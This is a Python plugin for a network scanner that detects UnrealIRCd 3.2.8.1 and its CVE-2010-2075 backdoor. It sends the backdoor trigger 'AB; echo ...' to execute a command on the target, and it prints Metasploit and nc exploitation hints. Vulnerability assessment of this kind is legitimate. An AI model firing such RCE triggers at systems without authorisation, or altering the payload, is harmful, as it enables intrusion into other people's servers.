# plugins/irc_plugin.py
from .plugin_base import PluginBase
import socket
import re

UNREAL_BACKDOOR_TRIGGER = b"AB; echo BLACKPORT_IRC_PROBE\n"
UNREAL_BACKDOOR_VERSION = "3.2.8.1"

class IRCPlugin(PluginBase):
    name = "IRC Backdoor Check"
    applicable_services = ["Unknown"]

    def _get_irc_version(self, target, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(4)
                s.connect((target, port))
                s.recv(2048)
                s.sendall(b"NICK blackport\r\nUSER blackport 0 * :BlackPort\r\n")
                data = b""
                for _ in range(5):
                    chunk = s.recv(2048)
                    if not chunk:
                        break
                    data += chunk
                    if b"001" in data or b"ERROR" in data:
                        break
                decoded = data.decode(errors="ignore")
                match = re.search(r"UnrealIRCd[- ](\d+\.\d+\.\d+\.?\d*)", decoded, re.IGNORECASE)
                if match:
                    return match.group(1)
        except Exception:
            pass
        return None

    def run(self, target, port, banner=None):
        if port not in {6667, 6668, 6669, 6697, 7000}:
            return None

        # Run on known IRC ports regardless of banner — banner may be None under load
        if banner and "irc" not in banner.lower() and "NOTICE" not in banner and "irc" not in (banner or "").lower():
            return None


        notes = []
        risk = "MEDIUM"
        exploit_hint = None

        # Attempt version detection
        irc_version = self._get_irc_version(target, port)

        if irc_version:
            notes.append(f"UnrealIRCd {irc_version} detected.")
            if irc_version == UNREAL_BACKDOOR_VERSION:
                notes.append(f"KNOWN BACKDOOR VERSION — CVE-2010-2075, unauthenticated RCE.")
                risk = "CRITICAL"
                exploit_hint = (
                    f"Metasploit: use exploit/unix/irc/unreal_ircd_3281_backdoor; "
                    f"set RHOSTS {target}; set RPORT {port}; run"
                )
                # Probe for live backdoor
                if self._probe_unreal_backdoor(target, port):
                    notes.append("BACKDOOR CONFIRMED LIVE — remote command execution verified.")
                else:
                    notes.append("Backdoor trigger sent — manual confirmation recommended.")
            else:
                notes.append("Version does not match known backdoor — check for other CVEs.")
        else:
            # Version detection blocked by ident requirement
            notes.append(
                "IRC server detected — version detection blocked by ident check. "
                f"Manually verify: nc {target} {port} then send NICK x / USER x 0 * :x"
            )
            notes.append(
                "If UnrealIRCd 3.2.8.1 confirmed, exploit with: "
                "Metasploit exploit/unix/irc/unreal_ircd_3281_backdoor"
            )
            exploit_hint = f"Manual check required: nc {target} {port}"

        # Hostname disclosure
        if banner:
            host_match = re.search(r":(\S+\.\S+) NOTICE", banner)
            if host_match:
                notes.append(f"Server discloses hostname: {host_match.group(1)}")

        if port == 6667:
            notes.append("Unencrypted IRC — all traffic visible in plaintext.")
        elif port == 6697:
            notes.append("SSL IRC — traffic encrypted.")

        return {
            "plugin": self.name,
            "risk": risk,
            "notes": " | ".join(notes),
            "exploit_hint": exploit_hint
        }

    def _probe_unreal_backdoor(self, target, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(4)
                s.connect((target, port))
                s.recv(2048)
                s.sendall(UNREAL_BACKDOOR_TRIGGER)
                response = s.recv(2048).decode(errors="ignore")
                if "BLACKPORT_IRC_PROBE" in response:
                    return True
        except Exception:
            pass
        return False
